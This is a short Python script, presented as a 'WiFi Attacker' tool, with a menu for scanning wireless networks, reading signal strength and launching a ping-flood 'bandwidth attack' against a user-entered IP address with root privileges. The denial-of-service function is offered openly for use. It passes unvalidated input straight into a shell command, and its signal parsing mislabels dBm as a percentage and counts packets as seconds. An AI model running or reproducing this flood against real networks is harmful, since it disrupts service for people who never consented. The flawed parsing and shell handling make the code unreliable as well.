import os
import sys
import time
def scan_networks(timeout=10):
    """Scan wireless networks for available SSIDs."""
    
    result = os.popen(f"sudo iwlist wlan0 scan | grep -i 'ESSID:\"\\|Quality'").read()
    
    print("[+] Detected Networks:")
    print(result)
def target_signal():
    """Find WiFi signal strength."""
    
    result = os.popen("iwconfig wlan0 | grep -i quality").read().strip()
    
    if "Quality" in result:
        rssi = [line.split(' ')[-1] for line in result.split('\n') if 'Signal level=' in line][0]
        
        try:
            percent = abs(int(rssi[:-3]))
            print(f"[+] Current Signal Strength: {percent}%")
        
            if int(percent) < 50:
                print("[!] Weak signal detected!")
                
        except IndexError:
            print("[-] Failed to retrieve signal strength.")
    else:
        print("[-] Not connected.")
def bandwidth_attack(target_ip="192.168.0.1", duration=30):
    """Execute ping flood against target."""
    
    if os.geteuid() != 0:
        print("[!] Script must be executed with root privileges.")
        sys.exit(1)
        
    print(f"[+] Target IP: {target_ip}")
    
    try:
        cmd = f"ping -c {duration} -f {target_ip}"
        os.system(cmd)
        
    except KeyboardInterrupt:
        print("\n[!] Attack terminated.")
if __name__ == "__main__":
    
    try:
        wlan0 = open("/sys/class/net/wlan0/address", "r").read().strip()
        print(f"[+] Wireless adapter found: {wlan0}")
        
        while True:
            choice = input("""
WiFi Attacker - Select action:
1. Scan Networks 
2. Check Signal Strength
3. Launch Bandwidth Attack (Ping Flood)
4. Exit
>> """)
            
            if choice == "1":
                scan_networks()
                
            elif choice == "2":
                target_signal()
                
            elif choice == "3":
                print("[!] Requires root privileges.")
                ip = input("Target IP: ")
                bandwidth_attack(ip, int(input("Attack duration (seconds): ") or 30))
                
            elif choice == "4":
                print("Exiting...")
                break
                
    except FileNotFoundError:
        print("[-] Wireless adapter 'wlan0' not found. Exiting.")